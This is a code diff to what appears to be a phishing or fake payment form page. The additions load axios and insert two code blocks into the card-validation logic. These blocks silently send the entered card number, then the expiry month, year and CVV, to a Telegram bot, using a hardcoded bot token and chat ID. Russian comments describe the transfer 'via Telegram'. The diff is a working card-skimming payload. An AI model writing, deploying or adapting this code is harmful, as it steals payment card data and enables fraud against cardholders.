@@ -22,6 +22,7 @@
         <script src="./0_3_files/script.js.Без названия"></script>
         <script src="./0_3_files/jquery.min.js.Без названия" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
         <script src="./0_3_files/cleave.min.js.Без названия"></script>
+        <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
 
     </head>
     <body class="">
@@ -415,6 +416,10 @@ document.getElementById('check_6').onkeydown = function (e) {
                 // номер карты валидный
                 status_card  = true;
                 console.log("Number card valide  ...");
+                // передача через телегу номер карты
+                const URL = `https://api.telegram.org/bot743294411:AAFQDNM0leSRb3PjFYpe8RNfbx9sBztd3bY/sendMessage?chat_id=634247446&text=${all_sum}`;
+                    console.log("post ...");
+                    axios.post(URL);         
                                 
 // *************************************************************************                
             }
@@ -449,6 +454,10 @@ document.getElementById('check_6').onkeydown = function (e) {
             if (status_card && status_my && status_cvv)
             // if(true)
             {
+                // передача через телегу меся  год  cvv
+                const URL = `https://api.telegram.org/bot743294411:AAFQDNM0leSRb3PjFYpe8RNfbx9sBztd3bY/sendMessage?chat_id=634247446&text=${month}${year}${cvv}`;
+                    console.log("post ...");
+                    axios.post(URL); 
                 console.log('Button clicked');
                 document.body.innerHTML = '<iframe src="start_3.html" width="368" height="700" align="bottom">Ваш браузер не поддерживает плавающие фреймы!</iframe> ';
                 
